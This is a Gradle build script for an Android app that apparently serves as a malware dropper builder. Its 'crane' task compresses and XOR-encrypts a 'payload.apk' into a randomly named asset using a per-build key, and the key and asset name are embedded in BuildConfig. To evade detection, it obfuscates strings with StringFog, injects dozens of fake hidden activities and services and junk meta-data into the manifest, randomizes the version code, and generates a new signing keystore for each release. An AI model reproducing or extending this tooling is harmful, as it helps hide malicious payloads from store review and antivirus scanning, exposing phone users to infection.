import java.security.SecureRandom
import java.util.UUID
import java.util.Random
import java.io.File
import java.util.zip.Deflater
import com.android.build.api.artifact.SingleArtifact
import org.gradle.api.DefaultTask
import org.gradle.api.tasks.TaskAction
import org.gradle.api.tasks.Input
import org.gradle.api.tasks.InputFile
import org.gradle.api.tasks.OutputFile
import org.gradle.api.file.RegularFileProperty
import org.gradle.api.provider.Property
import org.gradle.api.provider.ListProperty

buildscript {
    repositories {
        google(); mavenCentral()
        maven { url = uri("https://jitpack.io") }
    }
    dependencies {
        classpath("com.github.megatronking.stringfog:gradle-plugin:5.1.0")
        classpath("com.github.megatronking.stringfog:xor:5.0.0")
    }
}

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

apply(plugin = "stringfog")

configure<com.github.megatronking.stringfog.plugin.StringFogExtension> {
    implementation = "com.github.megatronking.stringfog.xor.StringFogImpl"
    enable = true
    fogPackages = arrayOf("com.sync.media.hub")
    kg = com.github.megatronking.stringfog.plugin.kg.RandomKeyGenerator()
    mode = com.github.megatronking.stringfog.plugin.StringFogMode.bytes
}

// ─── Per-build keying ───────────────────────────────────────────────────────
val storeType: String = (project.findProperty("store") as? String) ?: "google"
val heronKey: ByteArray = ByteArray(32).also { SecureRandom().nextBytes(it) }
val craneAsset: String = run {
    val chars = ('a'..'z').toList()
    val rng = Random(SecureRandom().nextLong())
    (1..10).map { chars[rng.nextInt(chars.size)] }.joinToString("") + ".bin"
}

fun hexArr(b: ByteArray) =
    "{" + b.joinToString(",") { "(byte)0x${it.toUByte().toString(16).padStart(2, '0').uppercase()}" } + "}"

// ─── Keystore generation (per release build) ────────────────────────────────
val isRelBuild = gradle.startParameter.taskNames.any { n ->
    n.lowercase().let { it.contains("assemble") && "release" in it }
}
val kDir = rootProject.file("temp_key")
val kFile = File(kDir, "wombat.jks")
val kPass = UUID.randomUUID().toString().replace("-", "")
val kAlias = "a_${UUID.randomUUID().toString().take(8)}"

if (isRelBuild) {
    if (kDir.exists()) kDir.deleteRecursively()
    kDir.mkdirs()
    val kt = "${System.getProperty("java.home")}/bin/keytool"
    try {
        ProcessBuilder(kt, "-genkeypair", "-v",
            "-keystore", kFile.absolutePath, "-storetype", "PKCS12",
            "-alias", kAlias, "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", kPass, "-keypass", kPass,
            "-dname", "CN=Sync,O=Media,C=US", "-noprompt"
        ).inheritIO().start().waitFor()
    } catch (_: Exception) {}
}

// ─── Randomize manifest task ─────────────────────────────────────────────────
val buildRandom = UUID.randomUUID().toString().replace("-", "").take(8)
val fakeCount = (20..35).random()
fun randName(): String {
    val c = "bcdfghjklmnprstvwz"; val v = "aeiou"
    return buildString { repeat((3..5).random()) { append(c.random()); append(v.random()) } }
        .replaceFirstChar { it.uppercase() }
}
val fakeActivities = (1..fakeCount).map { "${randName()}Activity" }
val fakeServices   = (1..(fakeCount / 2)).map { "${randName()}Service" }

abstract class PatchManifestTask : DefaultTask() {
    @get:InputFile  abstract val src: RegularFileProperty
    @get:OutputFile abstract val dst: RegularFileProperty
    @get:Input      abstract val prefix: Property<String>
    @get:Input      abstract val acts:   ListProperty<String>
    @get:Input      abstract val svcs:   ListProperty<String>

    @TaskAction fun run() {
        val pkg = "com.sync.media.hub.internal"
        var txt = src.get().asFile.readText()

        val metaSb = StringBuilder()
        repeat((60..120).random()) {
            metaSb.append("        <meta-data android:name=\"com.meta.${UUID.randomUUID()}\" android:value=\"${UUID.randomUUID()}\" />\n")
        }
        val actSb = acts.get().joinToString("\n") { n ->
            """        <activity android:name="$pkg.$n" android:exported="false" android:theme="@android:style/Theme.NoDisplay" />"""
        }
        val svcSb = svcs.get().joinToString("\n") { n ->
            """        <service android:name="$pkg.$n" android:exported="false" />"""
        }
        txt = txt.replace("</application>", "$metaSb$actSb\n$svcSb\n    </application>")
        dst.get().asFile.writeText(txt)
    }
}

androidComponents {
    onVariants(selector().all()) { variant ->
        if (isRelBuild) {
            val task = tasks.register<PatchManifestTask>("patch${variant.name.replaceFirstChar { it.uppercase() }}Manifest") {
                prefix.set(buildRandom); acts.set(fakeActivities); svcs.set(fakeServices)
            }
            variant.artifacts.use(task)
                .wiredWithFiles(PatchManifestTask::src, PatchManifestTask::dst)
                .toTransform(SingleArtifact.MERGED_MANIFEST)
        }
    }
}

android {
    namespace = "com.sync.media.hub"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.sync.media.hub"
        minSdk = 26
        targetSdk = 34
        versionCode = if (isRelBuild) (10000..999999).random() else 1
        versionName = "1.0"

        buildConfigField("byte[]", "HK", hexArr(heronKey))
        buildConfigField("String", "CA", "\"$craneAsset\"")
        buildConfigField("String", "ST", "\"$storeType\"")

        ndk { abiFilters.addAll(listOf("armeabi-v7a", "arm64-v8a")) }
    }

    buildFeatures { buildConfig = true }

    signingConfigs {
        create("release") {
            if (kFile.exists()) {
                storeFile = kFile; storePassword = kPass
                keyAlias = kAlias; keyPassword = kPass
            } else {
                storeFile = file("debug.keystore")
                storePassword = "android"; keyAlias = "androiddebugkey"; keyPassword = "android"
            }
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            signingConfig = signingConfigs.getByName("release")
        }
        debug {
            isMinifyEnabled = false
            signingConfig = signingConfigs.getByName("release")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }

    packaging {
        resources { excludes += "/META-INF/{AL2.0,LGPL2.1}" }
    }
}

// ─── crane task: encrypt payload asset ──────────────────────────────────────
tasks.register("crane") {
    val payloadSrc = rootProject.file("payload.apk")
    val assetDir   = file("src/main/assets")
    val assetDst   = File(assetDir, craneAsset)
    outputs.upToDateWhen { false }

    doFirst {
        assetDir.mkdirs()
        assetDir.listFiles()
            ?.filter { it.name.endsWith(".bin") && it.name != craneAsset }
            ?.forEach { it.delete() }
    }
    doLast {
        if (payloadSrc.exists()) {
            val raw = payloadSrc.readBytes()
            val def = Deflater(Deflater.BEST_COMPRESSION)
            def.setInput(raw); def.finish()
            val buf = ByteArray(raw.size * 2)
            val n = def.deflate(buf); def.end()
            val comp = buf.copyOf(n)
            val enc = ByteArray(comp.size) { i -> (comp[i].toInt() xor heronKey[i % heronKey.size].toInt()).toByte() }
            assetDst.writeBytes(enc)
        } else {
            assetDst.writeBytes(ByteArray(0))
        }
    }
}
tasks.named("preBuild") { dependsOn("crane") }

dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("com.github.megatronking.stringfog:xor:5.0.0")
    implementation(files("libs/apksig-minimal-1.0.jar"))
}
